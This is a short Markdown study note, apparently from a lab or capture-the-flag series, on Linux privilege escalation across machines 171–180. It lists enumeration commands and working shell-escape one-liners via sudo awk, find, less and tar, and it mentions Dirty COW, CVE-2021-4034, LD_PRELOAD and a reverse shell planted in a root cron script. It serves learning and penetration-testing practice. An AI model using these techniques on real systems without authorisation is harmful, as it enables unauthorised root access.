## 🛡️ Privilege Escalation (Machines 171–180)

### Enumeration

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
id
uname -a
ps aux
```

### Exploitation Techniques

```bash
# Sudo misconfigurations
sudo <binary>             # e.g., sudo vi, sudo less, sudo awk

# SUID exploitation
./<suid_binary>           # Check GTFOBins for privesc methods

# Capabilities
getcap /bin/*             # Look for unusual capabilities set

# Kernel exploits
searchsploit linux kernel <version>
# Example:
searchsploit linux kernel 5.8

# Writable scripts executed by root
find / -writable -type f -name "*.sh" 2>/dev/null
```

### Notes from Machines

- **Machine 171**: Found sudo NOPASSWD on `awk`, used `sudo awk 'BEGIN {system("/bin/sh")}'`.
- **Machine 172**: `find` binary with SUID bit, used `find . -exec /bin/sh \;`.
- **Machine 173**: Exploited capability `cap_setuid+ep` on Python binary.
- **Machine 174**: Kernel 4.4.0 vulnerable to dirty cow → used exploit to get root.
- **Machine 175**: Writable backup script run by root cron job → added reverse shell to escalate.
- **Machine 176**: Misconfigured sudo access to `less` → spawned shell via `!sh`.
- **Machine 177**: SUID binary allowed command execution as root.
- **Machine 178**: Used outdated `pkexec` version → exploited CVE-2021-4034.
- **Machine 179**: Escalated via `LD_PRELOAD` in a script executed by root.
- **Machine 180**: `sudo` rights on `tar` → used `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`.